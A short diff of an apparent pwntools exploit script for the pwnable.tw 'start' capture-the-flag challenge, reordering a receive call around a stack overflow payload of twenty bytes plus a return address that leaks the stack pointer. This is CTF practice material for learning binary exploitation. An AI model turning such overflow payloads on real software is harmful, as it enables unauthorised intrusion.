@@ -4,11 +4,10 @@ r = process('./start')
 # r = remote('chall.pwnable.tw',10000)
 
 raw_input("#")
+r.recvuntil("Let's start the CTF:")
 
-r.recvuntil("")
 r.send('a'*20+p32(0x08048087))
 
-r.recvuntil("Let's start the CTF:")
 k=r.recv(4)
 esp = u32(k)
 print k
